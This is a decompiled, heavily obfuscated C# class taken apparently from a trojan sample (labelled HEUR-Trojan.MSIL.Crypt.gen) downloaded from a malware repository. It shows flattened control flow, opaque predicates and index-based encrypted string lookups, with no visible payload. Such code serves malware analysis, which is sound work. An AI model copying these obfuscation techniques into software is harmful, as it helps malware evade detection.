// Decompiled with JetBrains decompiler
// Type: @ӹ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;

internal sealed class \u0040ӹ : \u0040Ӡ
{
  private readonly object \u0040ӓ;
  private readonly int \u0040Ӕ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public string \u003788() => (string) this.\u0040ӓ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public int \u003193() => this.\u0040Ӕ;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0040ӹ(string _param1, string _param2, \u0040Ԫ _param3)
  {
    \u0040ӹ.\u0040Ӛ();
    int num1;
    if (!\u0040ӹ.\u0040ӛ())
    {
      if (true)
      {
        num1 = 2;
        goto label_4;
      }
    }
    else
      goto label_7;
label_3:
    \u0040ӹ.\u0040Ӗ((object) this);
    goto label_8;
label_4:
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 2:
          goto label_6;
        case 1:
        case 3:
          goto label_3;
        case 4:
          goto label_8;
        default:
          num1 = 4;
          continue;
      }
    }
label_6:
    \u0040ӹ.\u0040ӕ();
    goto label_3;
label_7:
    num1 = 3;
    goto label_4;
label_8:
    try
    {
      \u0040ӹ.\u0040Ә((object) _param1, \u0040ӹ.\u0040ӗ(940), (object) \u0040ԝ.\u0040\u05BE(_param2.\u0040ӗ<Dictionary<string, string>>()[(string) \u0040ӹ.\u0040ӗ(948)]), _param3);
      \u0040ӹ.\u0040Ӛ();
      int num2;
      if (!\u0040ӹ.\u0040ӛ())
      {
        if (\u0040ӹ.\u0040Ӛ())
        {
          num2 = 2;
          goto label_12;
        }
      }
      else
        goto label_14;
label_11:
      this.\u0040Ӕ = 0;
      return;
label_12:
      switch (num2)
      {
        case 0:
        case 2:
          goto label_11;
        case 1:
          return;
        case 3:
          return;
        default:
          return;
      }
label_14:
      num2 = 3;
      goto label_12;
    }
    catch (Exception ex)
    {
      this.\u0040ӓ = \u0040ӹ.\u0040ә((object) ex);
      this.\u0040Ӕ = 1;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӕ() => \u0040ո.\u0040Ӕ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӗ(object _param0) => _param0.\u002Ector();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӗ(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ә(object _param0, object _param1, object _param2, \u0040Ԫ _param3) => \u0040Ԡ.\u0040Ӕ.\u0040Ӗ(_param0, _param1, _param2, _param3);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ә(object _param0) => (object) ((Exception) _param0).Message;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӛ() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӛ() => false;
}
